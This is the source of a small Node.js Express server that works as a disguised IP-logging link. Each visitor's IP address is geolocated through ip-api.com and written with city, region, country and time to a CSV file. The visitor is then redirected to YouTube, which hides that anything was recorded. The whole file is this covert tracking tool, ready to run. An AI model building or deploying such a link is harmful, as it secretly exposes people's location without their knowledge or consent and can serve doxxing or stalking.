const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Trust proxy headers
app.set('trust proxy', true);

// CSV file path
const csvFilePath = path.join(__dirname, 'visitors.csv');

// Add header to CSV if file doesn't exist
if (!fs.existsSync(csvFilePath)) {
  fs.writeFileSync(csvFilePath, 'IP,City,Region,Country,Time\n', 'utf8');
}

app.get('/', async (req, res) => {
  const rawIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress;
  const ip = rawIp?.replace('::ffff:', '');

  try {
    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
    const { city, regionName, country } = geoRes.data;
    const time = new Date().toISOString();

    console.log(`User IP: ${ip}`);
    console.log(`Location: ${city}, ${regionName}, ${country}`);

    // Append to CSV file
    const row = `${ip},${city || 'N/A'},${regionName || 'N/A'},${country || 'N/A'},${time}\n`;
    fs.appendFile(csvFilePath, row, (err) => {
      if (err) console.error('Error saving to CSV:', err.message);
    });

    res.redirect('https://youtube.com');
  } catch (err) {
    console.error('Geo lookup failed:', err.message);
    res.redirect('https://youtube.com');
  }
});

app.listen(port, () => {
  console.log(`✅ Server running on port ${port}`);
});
